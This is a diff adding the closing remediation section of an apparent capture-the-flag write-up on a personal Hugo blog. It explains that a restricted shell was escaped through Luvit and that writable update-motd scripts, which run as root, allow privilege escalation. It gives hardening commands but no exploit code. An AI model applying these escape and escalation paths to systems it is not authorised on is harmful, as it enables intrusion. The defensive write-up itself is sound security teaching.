+  Topic #1: Breaking Out of the Restricted Environment
+  <a class="heading-link" href="#topic-1-breaking-out-of-the-restricted-environment">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>The fact that the initial shell was so restricted was good. Any system interaction with the cold and uncaring outside world should come with a healthy dose of skepticism. However, the mistake made was allowing that restricted user to interact with programs that could allow them to break out of their metaphorical &ldquo;jail cell&rdquo;. Luvit, or any program where interaction with the underlying system is possible, for that matter, should be restricted to users who are trusted. Without that ability, it&rsquo;s likely that I would not have been able to escalate privileges at all.</p>
+<h2 id="topic-2-motd">
+  Topic #2: MOTD
+  <a class="heading-link" href="#topic-2-motd">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>One would think that a systems administrator, as is implied by the <code>sysadmin</code> accout, may want to change the message presented to users upon login. In fact, <a href="https://nvd.nist.gov/800-53/Rev4/control/AC-8"  class="external-link" target="_blank" rel="noopener">some security frameworks require it</a>. However, all that&rsquo;s needed to modify that is write-access to <code>/etc/motd</code>. Given that update-motd scripts (dynamic MOTD) are run as <code>root</code> via the PAM module, any ability to modify those scripts should be carefully considered when designing the system. I&rsquo;d err on the side of disabling dynamic MOTD altogether unless there&rsquo;s a particular reason that it is needed. In order to disable it, one could run <code>sudo apt-get purge update-motd</code> or <code>sudo chmod -x /etc/update-motd.d/*</code>.</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2020 -
+    
+    2025
+     matt johnson 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
